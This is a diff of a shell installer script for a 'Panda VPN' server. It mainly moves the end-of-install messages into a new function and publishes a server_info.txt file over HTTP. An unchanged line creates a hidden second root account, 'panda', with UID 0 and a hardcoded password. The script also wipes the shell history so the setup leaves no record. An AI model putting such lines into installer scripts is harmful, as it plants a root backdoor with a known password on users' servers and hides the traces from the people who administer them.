@@ -1151,32 +1151,6 @@ echo 'DNS=1.1.1.1
 DNSStubListener=no' >> /etc/resolv.conf
 sed -i "s|127.0.0.53|1.1.1.1|g" /etc/resolv.conf
 useradd -p $(openssl passwd -1 pandavpnunite) panda -ou 0 -g 0
-cd ~ 
-rm -rf .bash_history
-history -c;
-
-echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
-echo '#############################################
-#         Authentication file system        #
-#       Setup by: Pandavpn Unite            #
-#       Server System: Panda VPN 	        #
-#            owner: Pandavpnunite      	    #
-#############################################'
-echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
-netstat -tupln
-cd ~
-echo "alias my_dns='cat /root/ns.txt'" >> .bashrc
-echo "alias my_ports='cat /root/.ports'" >> .bashrc
-. .bashrc
-echo "
-Panda VPN Available command for execution: 
-
-1. my_dns -> this will print your generated name server
-2. my_ports -> this will print all the available ports in Panda Server
-
-"
-echo "Installation Completed!"
-echo "Please copy the below for your Domain Name Server: $(cat /root/ns.txt)"
 }
 
 ip_upload()
@@ -1283,6 +1257,42 @@ EOF
  
 }
 
+
+installation_end_message(){
+cd ~ 
+
+echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+echo '#############################################
+#         Authentication file system        #
+#       Setup by: Pandavpn Unite            #
+#       Server System: Panda VPN 	        #
+#            owner: Pandavpnunite      	    #
+#############################################'
+echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+netstat -tupln
+cd ~
+echo "alias my_dns='cat /root/ns.txt'" >> .bashrc
+echo "alias my_ports='cat /root/.ports'" >> .bashrc
+. .bashrc
+echo "
+Panda VPN Available command for execution: 
+
+1. my_dns -> this will print your generated name server
+2. my_ports -> this will print all the available ports in Panda Server
+
+"
+
+cat /root/.web/server_info.txt
+echo "Installation Completed!"
+
+echo "Please copy the below for your Domain Name Server: $(cat /root/ns.txt)"
+echo "Server info also available here: http://$server_ip/server_info.txt"
+
+
+rm -rf .bash_history
+history -c;
+}
+
  
 
 install_require
@@ -1307,3 +1317,4 @@ ip_upload
 start_service
 server_info
 install_v2ray
+installation_end_message
